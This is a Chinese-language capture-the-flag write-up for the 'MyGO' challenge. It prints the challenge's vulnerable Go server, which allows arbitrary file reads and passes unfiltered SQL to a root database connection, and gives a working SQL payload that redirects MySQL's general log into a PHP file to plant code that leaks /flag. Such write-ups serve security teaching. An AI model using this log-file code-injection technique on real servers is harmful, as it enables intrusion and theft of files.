# Spirit CTF 2023#2 题解 - MyGO
![](./img/mygo_desc.png)

Hint
---

![](./img/mygo_hint_0.png)

这个是说`Dockerfile`没删

![](./img/mygo_hint_1.png)

这个是说有Go的源码

![](./img/mygo_hint_2.png)

这个是说可以任意文件读

Solution
---

```
/Dockerfile
```

```docker
FROM mysql:debian
EXPOSE 8080
RUN apt-get update && apt-get install -y php
COPY . /app
WORKDIR /app
ENTRYPOINT [ "./docker-entrypoint.sh" ]
```

```
/docker-entrypoint.sh
```

```bash
#!/bin/sh
mysqld --initialize-insecure --datadir=/var/lib/mysql
mysqld --user=root &

while true; do
    mysql -e "show databases;" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        break
    fi
    sleep 1
done
mysql -e "CREATE USER 'root'@'127.0.0.1' IDENTIFIED BY 'root'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'127.0.0.1'; FLUSH PRIVILEGES;"
chown -R mysql:mysql /app
echo $FLAG > /flag
unset FLAG
./mygo
```

```
/main.go
```

```go
// ...

func generateRandomImage() error {
	cmd := exec.Command("php", "./rand_img.php")
	_, err := cmd.Output()
	return err
}

func getHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.ServeFile(w, r, r.URL.Path[1:])
			return
		}
		generateRandomImage()
		data := ""
		if r.URL.Query().Get("go") != "" {
			result, err := query(r.URL.Query().Get("go"), db)
			if err != nil {
				data = err.Error()
			} else {
				data = result
			}

		}
		tmpl := template.Must(template.ParseFiles("index.html"))
		tmpl.Execute(w, data)
	}
}

func main() {
	// ...
	http.HandleFunc("/", getHandler(db))
	err = http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Printf("[ERROR] Failed to listen and serve: %v\n", err)
		return
	}
}
```

```
/rand_img.php
```

```php
<?php
$files = glob('imgs/*.*');
$file = array_rand($files);
copy($files[$file], 'image.jpg');
?>
```

通过MySQL日志写入文件，借由`image.jpg`带出

```sql
set global general_log_file="/app/rand_img.php";
set global general_log = 'ON';
select "<?php file_put_contents('image.jpg', file_get_contents('/flag')); ?>"
```

![](./img/mygo_solution.png)
